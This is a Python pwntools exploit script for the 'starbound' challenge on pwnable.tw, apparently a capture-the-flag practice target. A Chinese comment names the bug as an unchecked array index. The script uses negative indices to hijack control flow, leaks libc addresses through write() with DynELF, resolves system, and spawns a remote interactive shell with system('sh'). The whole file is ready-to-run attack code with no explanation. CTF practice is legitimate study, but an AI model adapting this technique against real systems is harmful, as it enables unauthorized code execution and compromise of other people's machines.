#数组下标未检查边界
from pwn import *

#context.log_level = 'debug'
prog = './starbound'
elf = ELF(prog)
#p = process(prog)

#libc = ELF("./")
p = remote('chall.pwnable.tw', 10202)

def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def set(name):
	p.sendlineafter("> ", '6')
	p.sendlineafter("> ", '2')
	p.sendlineafter("name: ", name)
def hack(diff, context):
	payload = str(diff).ljust(8, "a") + context
	p.sendlineafter("> ", payload)

def leak(addr):
	set(p32(gadget))
	payload = p32(elf.plt['write'])+p32(main)+p32(1)+p32(addr)+p32(4)
	hack(-33, payload)
	d = p.recv(4)
	success(d)
	return d



gadget = 0x8048e48
main = 0x804a605
def exp():
	d = DynELF(leak,elf=elf,libcdb=False)
	system = d.lookup('system','libc')
	#dbg('b* 0x804a65d')
	set('sh\x00\x00' + p32(gadget))
	payload = p32(system) + p32(main) + p32(0x80580d0)
	hack(-32, payload)
	p.interactive()
if __name__ == '__main__':
	exp()
